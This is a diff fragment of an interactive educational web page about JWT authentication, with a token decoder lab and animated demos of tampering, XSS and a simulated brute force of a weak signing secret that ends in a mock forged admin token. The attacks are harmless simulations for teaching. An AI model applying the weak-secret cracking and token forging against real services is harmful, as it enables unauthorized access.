+      <button class="btn btn-yellow" onclick="labLoadSample()">📋 Load Sample</button>
+      <button class="btn btn-blue" onclick="labClear()">🗑️ Clear</button>
+    </div>
+
+    <div class="lab-section-title">OUTPUT</div>
+    <div class="lab-output" id="labOutput">// Decoded output will appear here...</div>
+
+    <div style="margin-top:2rem;">
+      <div class="lab-section-title">MODIFY PAYLOAD (then re-encode)</div>
+      <textarea class="payload-editor" id="payloadEditor" placeholder='{"userId": 101, "role": "user", "exp": 1700000000}'></textarea>
+      <div class="lab-btns">
+        <button class="btn btn-yellow" onclick="labEncode()">⚙️ Re-encode Token</button>
+        <button class="btn btn-red" onclick="labMakeAdmin()">☠️ Try Role: admin</button>
+      </div>
+    </div>
+
+    <div style="margin-top:1rem;">
+      <div class="lab-section-title">VERIFY TOKEN (check structure)</div>
+      <button class="btn btn-green" onclick="labVerify()">🔐 Verify Structure</button>
+      <div class="lab-output" id="verifyOutput" style="margin-top:0.8rem;">// Verification result will appear here...</div>
+    </div>
+  </div>
+  <span class="section-num">11</span>
+</section>
+
+<!-- FOOTER -->
+<div style="text-align:center;padding:3rem 2rem;border-top:1px solid var(--border);font-family:var(--mono);font-size:0.75rem;color:var(--text-dim);">
+  <div style="color:var(--neon-green);font-size:1rem;margin-bottom:0.5rem;">JWT_DECODED</div>
+  Built for deep understanding — not just memorization
+</div>
+
+<script>
+// ===== STARS =====
+(function() {
+  const c = document.getElementById('stars');
+  for (let i = 0; i < 120; i++) {
+    const s = document.createElement('div');
+    s.className = 'star';
+    s.style.cssText = `left:${Math.random()*100}%;top:${Math.random()*100}%;--dur:${2+Math.random()*4}s;--delay:${Math.random()*4}s;opacity:${0.1+Math.random()*0.5}`;
+    c.appendChild(s);
+  }
+})();
+
+// ===== SCROLL PROGRESS =====
+window.addEventListener('scroll', () => {
+  const pct = window.scrollY / (document.body.scrollHeight - window.innerHeight) * 100;
+  document.getElementById('scrollProg').style.width = pct + '%';
+});
+
+// ===== SECTION 1: INTRO ANIM =====
+function playIntroAnim() {
+  const icons = ['userIcon','loginAction','serverIcon','rememberIcon'];
+  icons.forEach((id,i) => {
+    const el = document.getElementById(id);
+    el.style.transform = 'scale(0.8)';
+    el.style.opacity = '0.3';
+    setTimeout(() => {
+      el.style.transition = 'all 0.4s';
+      el.style.transform = 'scale(1.15)';
+      el.style.opacity = '1';
+      setTimeout(() => { el.style.transform = 'scale(1)'; }, 400);
+    }, i * 400);
+  });
+}
+playIntroAnim();
+
+// ===== SECTION 2: SESSION FLOW =====
+function playSessionFlow() {
+  const steps = document.querySelectorAll('.flow-step');
+  steps.forEach(s => { s.classList.remove('visible'); });
+  steps.forEach((s, i) => {
+    setTimeout(() => s.classList.add('visible'), i * 400);
+  });
+  // Fill memory
+  setTimeout(fillMemory, 800);
+}
+
+function fillMemory() {
+  const slots = document.getElementById('memorySlots');
+  slots.innerHTML = '';
+  const label = document.getElementById('memLabel');
+  for (let i = 0; i < 24; i++) {
+    const s = document.createElement('div');
+    s.className = 'memory-slot';
+    slots.appendChild(s);
+  }
+  let count = 0;
+  const slotEls = slots.querySelectorAll('.memory-slot');
+  const interval = setInterval(() => {
+    if (count < 8) {
+      slotEls[count].classList.add('used');
+      count++;
+      label.textContent = count + ' sessions';
+    } else clearInterval(interval);
+  }, 200);
+}
+
+function simProblem(type) {
+  const out = document.getElementById('problem-output');
+  const slots = document.getElementById('memorySlots');
+
+  if (type === 'restart') {
+    out.style.border = '1px solid rgba(255,51,102,0.5)';
+    out.style.background = 'rgba(255,51,102,0.08)';
+    out.style.color = 'var(--neon-red)';
+    out.innerHTML = '🔄 SERVER RESTARTED<br><span style="font-size:0.8rem;color:var(--text-dim)">All sessions wiped from memory. Every user logged out instantly!</span>';
+    slots.querySelectorAll('.memory-slot.used').forEach(s => {
+      s.classList.remove('used');
+      s.style.animation = 'blink 0.3s 3';
+      setTimeout(() => s.style.animation = '', 900);
+    });
+    document.getElementById('memLabel').textContent = '0 sessions';
+  } else if (type === 'traffic') {
+    out.style.border = '1px solid rgba(255,204,0,0.5)';
+    out.style.background = 'rgba(255,204,0,0.06)';
+    out.style.color = 'var(--neon-yellow)';
+    out.innerHTML = '📈 MEMORY OVERLOAD<br><span style="font-size:0.8rem;color:var(--text-dim)">1M users × 2KB per session = 2GB RAM just for sessions!</span>';
+    const allSlots = slots.querySelectorAll('.memory-slot');
+    allSlots.forEach((s, i) => {
+      setTimeout(() => s.classList.add('overload'), i * 50);
+    });
+  } else if (type === 'multi') {
+    out.style.border = '1px solid rgba(0,200,255,0.5)';
+    out.style.background = 'rgba(0,200,255,0.06)';
+    out.style.color = 'var(--neon-blue)';
+    out.innerHTML = '🌐 SERVER MISMATCH<br><span style="font-size:0.8rem;color:var(--text-dim)">User logs in on Server A. Request goes to Server B. No session found there — user gets logged out!</span>';
+  }
+}
+
+// ===== SECTION 3: JWT FLOW =====
+function playJwtFlow() {
+  const steps = document.querySelectorAll('#jwtFlow .jwt-step');
+  steps.forEach(s => s.classList.remove('active'));
+  steps.forEach((s, i) => {
+    setTimeout(() => s.classList.add('active'), i * 500);
+  });
+}
+
+function animateToken() {
+  const t = document.getElementById('movingToken');
+  t.classList.remove('animate');
+  t.style.transition = 'none';
+  t.style.left = '-220px';
+  setTimeout(() => {
+    t.style.transition = 'left 2s ease-in-out';
+    t.classList.add('animate');
+  }, 50);
+  setTimeout(() => {
+    t.style.transition = 'none';
+    t.style.left = '-220px';
+    t.classList.remove('animate');
+  }, 2200);
+}
+
+// ===== SECTION 5: STRUCTURE =====
+let activeDetail = null;
+function showDetail(part) {
+  const ids = ['hdr','pld','sgn'];
+  ids.forEach(id => {
+    document.getElementById('detail-'+id).classList.remove('active');
+  });
+  if (activeDetail === part) {
+    activeDetail = null;
+    return;
+  }
+  document.getElementById('detail-'+part).classList.add('active');
+  activeDetail = part;
+}
+
+// ===== SECTION 6: SIGNATURE ANIM =====
+function animateSig() {
+  const parts = ['sf4','sf5','sf6','sf7'];
+  parts.forEach(id => { document.getElementById(id).style.opacity = '0'; });
+
+  ['sf1','sf2','sf3'].forEach((id, i) => {
+    const el = document.getElementById(id);
+    setTimeout(() => {
+      el.style.transition = 'all 0.3s';
+      el.style.transform = 'scale(1.1)';
+      setTimeout(() => el.style.transform = 'scale(1)', 300);
+    }, i * 300);
+  });
+
+  setTimeout(() => {
+    ['sf4','sf5','sf6'].forEach((id, i) => {
+      setTimeout(() => {
+        const el = document.getElementById(id);
+        el.style.transition = 'opacity 0.4s';
+        el.style.opacity = '1';
+      }, i * 250);
+    });
+    setTimeout(() => {
+      const el = document.getElementById('sf7');
+      el.style.transition = 'opacity 0.5s';
+      el.style.opacity = '1';
+    }, 800);
+  }, 1000);
+}
+
+// ===== SECTION 7: ATTACKS =====
+function switchAttack(name, el) {
+  document.querySelectorAll('.attack-tab').forEach(t => t.classList.remove('active'));
+  document.querySelectorAll('.attack-panel').forEach(p => p.classList.remove('active'));
+  el.classList.add('active');
+  document.getElementById('attack-'+name).classList.add('active');
+}
+
+// TAMPER
+function updateTamper() {
+  const role = document.getElementById('roleSelect').value;
+  const payloadEl = document.getElementById('tamperPayload');
+  const sigEl = document.getElementById('tamperSig');
+  const status = document.getElementById('tamperStatus');
+
+  if (role === 'user') {
+    payloadEl.textContent = 'eyJ1c2VySWQiOjEwMSwicm9sZSI6InVzZXIifQ';
+    sigEl.className = 'tamper-part sig-ok';
+    sigEl.textContent = 'SflKxwRJSMeKKF2QT4fw';
+    status.textContent = 'Original token';
+    status.style.color = 'var(--neon-green)';
+    document.getElementById('tamperResult').className = 'tamper-result';
+  } else {
+    payloadEl.textContent = btoa(JSON.stringify({userId:101, role})).replace(/=/g,'');
+    sigEl.className = 'tamper-part sig-bad';
+    sigEl.textContent = 'INVALID_SIGNATURE_!!';
+    status.textContent = 'Token tampered!';
+    status.style.color = 'var(--neon-red)';
+    document.getElementById('tamperResult').className = 'tamper-result';
+  }
+}
+
+function sendTampered() {
+  const role = document.getElementById('roleSelect').value;
+  const res = document.getElementById('tamperResult');
+  res.classList.add('show');
+
+  if (role === 'user') {
+    res.className = 'tamper-result show granted';
+    res.innerHTML = '✅ 200 OK — Access Granted<br><span style="font-size:0.8rem;color:var(--text-dim)">Valid signature. Payload unchanged.</span>';
+  } else {
+    res.className = 'tamper-result show denied';
+    res.innerHTML = '🚫 401 Unauthorized — SIGNATURE MISMATCH<br><span style="font-size:0.8rem;color:var(--text-dim)">Server recalculated signature and it doesn\'t match! Token rejected.</span>';
+  }
+}
+
+// XSS
+let xssRunning = false;
+function playXSS() {
+  if (xssRunning) return;
+  xssRunning = true;
+  const steps = document.querySelectorAll('.xss-step');
+  steps.forEach(s => s.classList.remove('lit'));
+  steps.forEach((s, i) => {
+    setTimeout(() => {
+      s.classList.add('lit');
+      if (i === steps.length - 1) xssRunning = false;
+    }, i * 800);
+  });
+}
+
+// BRUTE FORCE
+let bfRunning = false;
+const weakPasswords = ['secret','password','123456','jwt','admin','key','token','mysecret','qwerty','letmein','hello','jwtkey'];
+const innocentAttempts = ['x7k2p','mN3vQ','abc123','pass1234','dragon','sunshine','monkey'];
+
+function startBruteForce() {
+  if (bfRunning) return;
+  bfRunning = true;
+  document.getElementById('bfBtn').disabled = true;
+  const log = document.getElementById('bfLog');
+  const bar = document.getElementById('bfBar');
+  log.innerHTML = '';
+  bar.style.width = '0%';
+
+  const allWords = [...innocentAttempts.slice(0,3), 'secret', ...innocentAttempts.slice(3)];
+  let idx = 0;
+  let found = false;
+
+  function addLine(html) {
+    log.innerHTML += html + '\n';
+    log.scrollTop = log.scrollHeight;
+  }
+
+  addLine('<span class="log-line">// Starting brute force on JWT secret...</span>');
+  addLine('<span class="log-trying">// Trying common wordlist...</span>');
+
+  const interval = setInterval(() => {
+    if (idx >= allWords.length) {
+      clearInterval(interval);
+      if (!found) addLine('<span class="log-line">// Secret not found in wordlist.</span>');
+      bfRunning = false;
+      document.getElementById('bfBtn').disabled = false;
+      return;
+    }
+    const word = allWords[idx];
+    const pct = Math.round((idx+1)/allWords.length*100);
+    bar.style.width = pct + '%';
+
+    if (word === 'secret') {
+      found = true;
+      addLine(`<span class="log-found">✓ SECRET FOUND: "${word}"</span>`);
+      addLine('<span class="log-found">✓ Forging admin token...</span>');
+      setTimeout(() => {
+        addLine('<span class="log-found">✓ eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOjEwMSwicm9sZSI6ImFkbWluIn0.forged_valid_sig</span>');
+        addLine('<span class="log-found">✓ Admin access obtained! Server accepted forged token.</span>');
+        bar.style.width = '100%';
+        clearInterval(interval);
+        bfRunning = false;
+        document.getElementById('bfBtn').disabled = false;
+      }, 600);
+    } else {
+      addLine(`<span class="log-line">✗ Trying: "${word}"... failed</span>`);
+    }
+    idx++;
+  }, 300);
+}
+
+// ===== SECTION 8: LIFECYCLE =====
+let timerInterval = null;
+let timerSec = 30;
+const timerMax = 30;
+
+function startTimer() {
+  if (timerInterval) { clearInterval(timerInterval); }
+  timerSec = timerMax;
+  updateTimerDisplay();
+
+  let lcIdx = 0;
+  const steps = document.querySelectorAll('.lc-step');
+
+  timerInterval = setInterval(() => {
+    timerSec--;
+    if (timerSec < 0) {
+      clearInterval(timerInterval);
+      timerInterval = null;
+      setLcStep(5);
+      return;
+    }
+    updateTimerDisplay();
+
+    // Advance lifecycle
+    const pct = timerSec / timerMax;
+    if (pct > 0.9) setLcStep(1);
+    else if (pct > 0.5) setLcStep(2);
+    else if (pct > 0.1) setLcStep(3);
+    else setLcStep(4);
+  }, 1000);
+}
+
+function setLcStep(idx) {
+  document.querySelectorAll('.lc-step').forEach((s,i) => {
+    s.classList.toggle('active', i === idx);
+  });
+}
+
+function updateTimerDisplay() {
+  const el = document.getElementById('timerDisplay');
+  const fill = document.getElementById('timerFill');
+  const min = String(Math.floor(timerSec/60)).padStart(2,'0');
+  const sec = String(timerSec % 60).padStart(2,'0');
+  el.textContent = `${min}:${sec}`;
+  const pct = timerSec / timerMax * 100;
+  fill.style.width = pct + '%';
+
+  const cls = pct > 50 ? '' : pct > 20 ? 'warn' : 'danger';
+  el.className = 'timer-display ' + cls;
+  fill.className = 'timer-fill ' + cls;
+}
+
+function resetTimer() {
+  if (timerInterval) { clearInterval(timerInterval); timerInterval = null; }
+  timerSec = timerMax;
+  updateTimerDisplay();
+  setLcStep(0);
+}
+
+// ===== SECTION 9: API REQUEST =====
+function sendRequest() {
+  const status = document.getElementById('reqStatus');
+  const result = document.getElementById('requestResult');
+
+  status.textContent = 'Sending...';
+  status.style.color = 'var(--neon-yellow)';
+
+  setTimeout(() => {
+    status.textContent = '200 OK';
+    status.style.color = 'var(--neon-green)';
+    result.className = 'request-status show';
+    result.innerHTML = `<span style="color:var(--neon-green)">✅ 200 OK</span> — Server Response:<br><br><span style="color:var(--text-dim)">{</span><br>  <span style="color:var(--neon-blue)">"userId"</span>: <span style="color:var(--neon-yellow)">101</span>,<br>  <span style="color:var(--neon-blue)">"username"</span>: <span style="color:var(--neon-yellow)">"alice"</span>,<br>  <span style="color:var(--neon-blue)">"email"</span>: <span style="color:var(--neon-yellow)">"alice@example.com"</span><br><span style="color:var(--text-dim)">}</span>`;
+  }, 1000);
+}
+
+// ===== SECTION 11: LAB =====
+const SAMPLE_TOKEN = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEwMSwicm9sZSI6InVzZXIiLCJleHAiOjE3MDAwMDAwMDAsImlhdCI6MTY5OTk5MDAwMH0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c';
+
+function b64decode(str) {
+  try {
+    str = str.replace(/-/g,'+').replace(/_/g,'/');
+    while (str.length % 4) str += '=';
+    return JSON.parse(atob(str));
+  } catch(e) { return null; }
+}
+
+function syntaxHighlight(obj) {
+  const json = JSON.stringify(obj, null, 2);
+  return json.replace(/"(\w+)":/g, '<span class="key">"$1"</span>:')
+             .replace(/: "([^"]+)"/g, ': <span class="val">"$1"</span>')
+             .replace(/: (\d+)/g, ': <span style="color:var(--neon-green)">$1</span>');
+}
+
+function labDecode() {
+  const token = document.getElementById('labInput').value.trim();
+  const out = document.getElementById('labOutput');
+  if (!token) { out.innerHTML = '<span class="err">// No token provided</span>'; return; }
+
+  const parts = token.split('.');
+  if (parts.length !== 3) {
+    out.innerHTML = '<span class="err">// Invalid JWT — expected 3 parts separated by dots</span>';
+    return;
+  }
+
+  const header = b64decode(parts[0]);
+  const payload = b64decode(parts[1]);
+
+  let result = '';
+  if (header) {
+    result += `<span class="ok">// ═══ HEADER ═══</span>\n${syntaxHighlight(header)}\n\n`;
+  } else {
+    result += `<span class="err">// Header decode failed</span>\n\n`;
+  }
+
+  if (payload) {
+    // Check expiry
+    const now = Math.floor(Date.now()/1000);
+    const expired = payload.exp && payload.exp < now;
+    result += `<span class="ok">// ═══ PAYLOAD ═══</span>\n${syntaxHighlight(payload)}\n`;
+    if (payload.exp) {
+      const d = new Date(payload.exp * 1000);
+      result += `\n<span class="${expired?'err':'ok'}">// exp = ${d.toUTCString()} ${expired?'(EXPIRED ⚠️)':'(valid)'}</span>\n`;
+    }
+    result += '\n';
+  } else {
+    result += `<span class="err">// Payload decode failed</span>\n\n`;
+  }
+
+  result += `<span class="ok">// ═══ SIGNATURE ═══</span>\n<span style="color:var(--neon-green)">${parts[2]}</span>\n`;
+  result += `<span class="err">// Note: Signature cannot be verified client-side without the secret key</span>`;
+
+  out.innerHTML = result;
+
+  // Populate payload editor
+  if (payload) {
+    document.getElementById('payloadEditor').value = JSON.stringify(payload, null, 2);
+  }
+}
+
+function labLoadSample() {
+  document.getElementById('labInput').value = SAMPLE_TOKEN;
+  labDecode();
+}
+
+function labClear() {
+  document.getElementById('labInput').value = '';
+  document.getElementById('labOutput').innerHTML = '// Decoded output will appear here...';
+  document.getElementById('payloadEditor').value = '';
+  document.getElementById('verifyOutput').innerHTML = '// Verification result will appear here...';
+}
+
+function b64encode(obj) {
+  return btoa(JSON.stringify(obj)).replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,'');
+}
+
+function labEncode() {
+  const out = document.getElementById('labOutput');
+  const raw = document.getElementById('payloadEditor').value.trim();
+  if (!raw) { out.innerHTML = '<span class="err">// No payload to encode</span>'; return; }
+
+  try {
+    const payload = JSON.parse(raw);
+    const header = { alg: 'HS256', typ: 'JWT' };
+    const encodedHeader = b64encode(header);
+    const encodedPayload = b64encode(payload);
+    const fakeToken = `${encodedHeader}.${encodedPayload}.SIGNATURE_NEEDS_SERVER_SECRET`;
+    out.innerHTML = `<span class="ok">// Re-encoded token (signature is placeholder — needs server secret to sign):</span>\n\n<span style="color:var(--neon-blue)">${encodedHeader}</span>.<span style="color:var(--neon-yellow)">${encodedPayload}</span>.<span style="color:var(--neon-red)">SIGNATURE_NEEDS_SERVER_SECRET</span>\n\n<span class="err">// ⚠️ Without the server's secret key, you cannot create a valid signature!</span>`;
+  } catch(e) {
+    out.innerHTML = `<span class="err">// Invalid JSON in payload editor: ${e.message}</span>`;
+  }
+}
+
+function labMakeAdmin() {
+  const raw = document.getElementById('payloadEditor').value.trim();
+  let payload = {};
+  try { payload = raw ? JSON.parse(raw) : { userId: 101, role: 'user', exp: 1700000000 }; } catch(e) {}
+  payload.role = 'admin';
+  document.getElementById('payloadEditor').value = JSON.stringify(payload, null, 2);
+  labEncode();
+}
+
+function labVerify() {
+  const token = document.getElementById('labInput').value.trim();
+  const out = document.getElementById('verifyOutput');
+
+  if (!token) { out.innerHTML = '<span class="err">// No token to verify</span>'; return; }
+
+  const parts = token.split('.');
+  let result = '';
+
+  if (parts.length !== 3) {
+    result = `<span class="err">✗ Structure: Invalid — expected 3 parts, got ${parts.length}</span>`;
+    out.innerHTML = result;
+    return;
+  }
+
+  result += `<span class="ok">✓ Structure: Valid (3 parts)</span>\n`;
+
+  const header = b64decode(parts[0]);
+  const payload = b64decode(parts[1]);
+
+  result += header ? `<span class="ok">✓ Header: Decodeable — alg: ${header.alg || '?'}, typ: ${header.typ || '?'}</span>\n` : `<span class="err">✗ Header: Not decodeable</span>\n`;
+  result += payload ? `<span class="ok">✓ Payload: Decodeable — ${Object.keys(payload).join(', ')}</span>\n` : `<span class="err">✗ Payload: Not decodeable</span>\n`;
+
+  if (payload) {
+    const now = Math.floor(Date.now()/1000);
+    if (payload.exp) {
+      result += payload.exp > now
+        ? `<span class="ok">✓ Expiry: Token not expired (exp: ${new Date(payload.exp*1000).toLocaleString()})</span>\n`
+        : `<span class="err">✗ Expiry: Token EXPIRED at ${new Date(payload.exp*1000).toLocaleString()}</span>\n`;
+    } else {
+      result += `<span style="color:var(--neon-yellow)">⚠ No exp claim — token never expires (bad practice!)</span>\n`;
+    }
+  }
+
+  result += `\n<span style="color:var(--neon-yellow)">⚠ Signature: Cannot verify client-side (needs secret key)</span>`;
+  out.innerHTML = result;
+}
+
+// Auto-play some intro animations
+setTimeout(playSessionFlow, 800);
+</script>
+</body>
+</html>
